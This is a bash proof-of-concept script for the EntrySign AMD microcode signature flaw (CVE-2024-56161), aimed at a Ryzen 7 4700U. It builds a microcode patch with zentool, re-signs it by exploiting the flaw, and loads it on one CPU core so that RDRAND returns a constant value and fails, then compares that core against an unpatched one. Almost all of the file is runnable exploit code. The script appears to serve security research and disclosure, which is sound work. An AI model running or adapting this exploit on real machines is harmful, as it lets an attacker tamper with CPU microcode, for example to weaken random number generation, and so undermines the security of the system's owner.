#!/usr/bin/env bash
# EntrySign CVE-2024-56161 PoC runner for Ryzen 7 4700U (Renoir, CPUID 0x8601)
# Run as root after reboot. Loads a carry-clear RDRAND patch on CPU core 3.
# Demonstrates arbitrary per-core microcode modification on an unpatched system.
#
# Microcode: 0x860010d (VULNERABLE, fixed version is 0x860010f)
# zentool: https://github.com/google/security-research (pocs/cpus/entrysign)

set -euo pipefail

ENTRYSIGN_DIR="/home/kenny/google-security-research/pocs/cpus/entrysign"
ZENTOOL="$ENTRYSIGN_DIR/zentool/zentool"
UCODE="$ENTRYSIGN_DIR/zentool/data/CPUMicrocodes/AMD/cpu00860F01_ver0860010F_2024-11-18_785D74AB.bin"
RDRAND_TEST="$ENTRYSIGN_DIR/rdrand_test"
PATCH_OUT="/tmp/renoir_rdrand_cc.bin"
TARGET_CPU=3

echo "[*] EntrySign PoC -- Ryzen 7 4700U / Renoir (CPUID 0x8601)"
echo "[*] Current microcode revisions:"
rdmsr -a 0x8b

echo ""
echo "[*] Building carry-clear RDRAND patch..."
# Key fix vs previous attempt: instructions must be in quad 0 (seq=7 means
# 'return from emulation'). Quad 0 executes, returns. Quad 1 never runs.
# Correct form: --seq 0=7 --insn q0i0=... q0i1=... (all in quad 0)
# This makes rdrand return a constant value with CF=0 (no carry = failure)
# causing rdrand_test to loop 10x and call fatalx("rdrand failed").
"$ZENTOOL" --output "$PATCH_OUT" edit \
    --nop all \
    --match all=0 \
    --match 0=@rdrand \
    --seq 0=7 \
    --insn q0i0="xor rax, rax, rax" \
    --hdr-revlow 0xff \
    "$UCODE"

echo "[*] Resigning patch..."
"$ZENTOOL" resign "$PATCH_OUT"

echo "[*] Verifying signature..."
"$ZENTOOL" verify "$PATCH_OUT"

echo ""
echo "[*] Reading physmap base from /proc/kcore..."
PHYSMAP=$(python3 /tmp/get_physmap.py)
echo "[*] physmap_base = $PHYSMAP"

echo ""
echo "[*] Loading patch on CPU $TARGET_CPU..."
"$ZENTOOL" load --physmap-base="$PHYSMAP" --cpu="$TARGET_CPU" "$PATCH_OUT"

echo ""
echo "[*] Microcode revisions after patch:"
rdmsr -a 0x8b

echo ""
echo "[*] Testing rdrand on CPU $TARGET_CPU (patched -- expect failure):"
taskset -c "$TARGET_CPU" "$RDRAND_TEST" || echo "[+] CONFIRMED: rdrand failed on patched core (CF=0 returned)"

echo ""
echo "[*] Testing rdrand on CPU 0 (unpatched -- expect success):"
taskset -c 0 "$RDRAND_TEST" && echo "[+] rdrand ok on unpatched core"
